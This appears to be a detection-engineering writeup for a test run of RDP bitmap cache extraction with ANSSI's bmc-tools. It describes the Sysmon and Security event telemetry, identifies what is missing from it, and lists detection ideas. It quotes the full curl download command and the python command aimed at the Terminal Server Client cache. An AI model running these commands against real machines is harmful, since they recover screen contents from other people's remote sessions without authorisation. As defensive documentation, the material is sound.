# T1113-10: Screen Capture — RDP Bitmap Cache Extraction via bmc-tools

## Technique Context

T1113 Screen Capture is a collection technique where adversaries capture screen contents to gather information about user activities, applications in use, and sensitive data displayed on the screen. The RDP bitmap cache extraction variant specifically targets cached bitmap data stored by Remote Desktop Protocol (RDP) clients. When users connect via RDP, the client caches bitmap fragments to improve performance, and these cached fragments can be reassembled to reconstruct partial or complete screenshots of previous RDP sessions.

The bmc-tools (Bitmap Cache Tools) developed by ANSSI-FR is a Python utility that extracts and reconstructs images from RDP bitmap cache files typically stored in `%LOCALAPPDATA%\Microsoft\Terminal Server Client\Cache`. This technique is particularly valuable for attackers who have gained access to systems that have been used to connect to other systems via RDP, as it can reveal sensitive information from those remote sessions without requiring active screen capture capabilities.

Detection engineers focus on monitoring for access to RDP cache directories, execution of tools that parse these cache files, and the creation of reconstructed image files in suspicious locations.

## What This Dataset Contains

This dataset captures a comprehensive execution of the bmc-tools technique with the following key activities:

**Tool Download and Setup:**
- PowerShell script execution downloading bmc-tools.py from GitHub via Security 4688: `"C:\Windows\system32\curl.exe" -L https://raw.githubusercontent.com/ANSSI-FR/bmc-tools/master/bmc-tools.py --output C:\Windows\TEMP\bmc-tools.py`
- Sysmon 1 events capturing the curl.exe process creation and python.exe execution
- Sysmon 11 file creation events for `C:\Windows\Temp\bmc-tools.py` and the output directory `C:\Windows\Temp\rdp_screens`

**Cache Processing:**
- Python execution targeting the RDP cache: `"C:\Program Files\Python312\python.exe" C:\Windows\TEMP\bmc-tools.py -s "C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Terminal Server Client\Cache" -d C:\Windows\TEMP\rdp_screens -b`
- PowerShell script blocks showing the complete attack flow in 4104 events
- DNS resolution for raw.githubusercontent.com captured in Sysmon 22

**Process Telemetry:**
- Complete process chain from PowerShell → curl → python with full command lines
- Sysmon 10 process access events showing PowerShell accessing child processes
- Security 4689 process termination events with exit code 0x0 (success)

## What This Dataset Does Not Contain

The dataset does not contain evidence of the actual bitmap extraction results, as there are no Sysmon 11 file creation events for reconstructed image files in the output directory. This suggests either:
- The RDP cache directory was empty or contained no parseable bitmap cache files
- The bmc-tools execution completed without finding extractable content
- The cache files were present but didn't contain reconstructable screen data

The dataset also lacks Sysmon 15 (FileCreateStreamHash) events that might capture the actual content of created image files, and there are no network connection events (Sysmon 3) beyond the initial tool download.

## Assessment

This dataset provides excellent visibility into the complete attack chain for RDP bitmap cache extraction. The combination of Security 4688 with full command-line logging and Sysmon 1/11 events creates a comprehensive detection surface. The PowerShell script block logging (4104) captures the entire malicious payload, while process access events (Sysmon 10) provide additional behavioral context.

The telemetry is particularly valuable because it captures both the tool acquisition phase (downloading bmc-tools.py) and the execution phase (processing RDP cache files), making it useful for detecting both the preparation and execution stages of this technique. The specific targeting of the Terminal Server Client cache directory is clearly visible in the command-line arguments.

## Detection Opportunities Present in This Data

1. **Tool Download Detection** - Monitor Security 4688 or Sysmon 1 for curl.exe downloading Python scripts from suspicious domains like raw.githubusercontent.com, especially files with "bmc" or "cache" in the name

2. **RDP Cache Directory Access** - Alert on process creation events where command lines contain paths to `Microsoft\Terminal Server Client\Cache` directories, particularly when accessed by non-standard processes

3. **Suspicious Python Script Execution** - Detect Python processes executing scripts from temporary directories (C:\Windows\TEMP) with command-line arguments referencing RDP cache paths (-s flag with Terminal Server Client path)

4. **PowerShell Script Block Analysis** - Monitor PowerShell 4104 events for script blocks containing strings like "Terminal Server Client\Cache", "bmc-tools", or bitmap extraction keywords

5. **File Creation in Temporary Directories** - Track Sysmon 11 events for creation of .py files in system temp directories, especially when created by network download tools

6. **Process Chain Analysis** - Correlate PowerShell → curl → python process chains where the python process targets RDP-related directories with extraction tools

7. **DNS Query Correlation** - Monitor Sysmon 22 for DNS queries to raw.githubusercontent.com followed by tool download activities and subsequent execution of the downloaded content
